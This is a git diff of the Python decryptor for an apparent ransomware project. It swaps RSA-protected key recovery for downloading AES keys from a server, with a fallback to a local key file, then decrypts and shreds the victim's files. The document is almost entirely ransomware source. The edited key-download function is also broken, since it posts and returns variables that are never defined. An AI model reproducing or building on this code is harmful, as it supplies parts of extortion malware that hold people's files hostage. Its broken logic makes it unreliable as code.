@@ -40,12 +40,6 @@ ransomware_path = os.path.join(home, ransomware_name)
 machine_id = enviroment.get_unique_machine_id()
 
 
-def decrypt_aes_keys(enc, key):
-    key_obj = RSA.importKey(key)
-    cipher = PKCS1_OAEP.new(key_obj)
-    return cipher.decrypt(enc)
-    
-
 def shred(file_name,  passes=1):
 
     def generate_data(length):
@@ -67,18 +61,15 @@ def shred(file_name,  passes=1):
     os.remove(file_name)
 
 
-def send_to_server_encrypted_private_key(id, private_encrypted_key):
+def download_from_server_aes_keys():
     
-    # do something with id later 
     try:
         ret = requests.post(server_address, data=private_encrypted_key)
     except Exception as e:
         raise e
 
-    print("key decrypted")
-
-    private_key = ret.text
-    return str(private_key)
+    aes_keys = ret.text
+    return private_key
 
 
 def payment():
@@ -87,46 +78,24 @@ def payment():
 
 def menu():
 
-    # import the private key
-    print("{}Importing the encrypted client private key".format(WHITE))
-    with open(ransomware_path + '/encrypted_client_private_key.key', 'rb') as f:
-        encrypted_client_private_key = pickle.load(f)
-    print("{}OK{}".format(GREEN, WHITE))
+    try:
+        aes_keys = download_from_server_aes_keys()
 
-    key_to_be_sent = base64.b64encode(str(encrypted_client_private_key))
+    except:
+        decr = []
+        with open(ransomware_path + "/AES_keys.txt", 'r') as f:
+            content = f.read()
 
-    # send to server to be decrypted
-    while True:
-        try:
-            print("Requesting to server to decrypt the private key")
-            client_private_key = send_to_server_encrypted_private_key(machine_id, key_to_be_sent)
-            break
-        except:
-            print("{}No connection, sleeping for 2 minutes\nConnect to internet to get your files back!{}".format(RED, WHITE))
-            time.sleep(120)
+        keys_and_base64_path = content.split("\n")
+        for k in keys_and_base64_path:
+            j = k.split(' ')
+            aes_key = j[0]
+            path = base64.b64decode(j[1])           
+            decr.append((aes_key, path))
 
-    # saving to disk the private key
-    print("{}Client private key decrypted and stored to disk{}".format(GREEN, WHITE))
-    with open(ransomware_path + "/client_private_key.PEM", 'wb') as f:
-        f.write(client_private_key)
-
-    # GET THE AES KEYS and path
-    with open(ransomware_path + "/AES_encrypted_keys.txt") as f:
-        content = f.read()
-     
-    # get the aes keys and IV's and paths back
-    print('Decrypting the files ...')
-    content = content.split('\n')
-    content.remove('')
-    aes_and_path = []
-    for line in content:
-        ret = line.split(' ') # enc(KEY) base64(PATH)
-        encrypted_aes_key = base64.b64decode(ret[0])
-        aes_key = decrypt_aes_keys(encrypted_aes_key, client_private_key)
-
-        aes_and_path.append((aes_key, base64.b64decode(ret[1])))
-
-    for _ in aes_and_path:
+   
+    # decryption
+    for _ in decr:
         dec = symmetric.AESCipher(_[0])
         
         with open(_[1], 'rb') as f:
@@ -144,7 +113,9 @@ def menu():
         shred(_[1])
 
     # end of decryptor
-    print("{}Decryption finished!{}".format(GREEN, WHITE))
+    print("{}Decryption finished!{}".format(GREEN, WHITE))    
+
+
 
 if __name__ == "__main__": 
     print(logo)
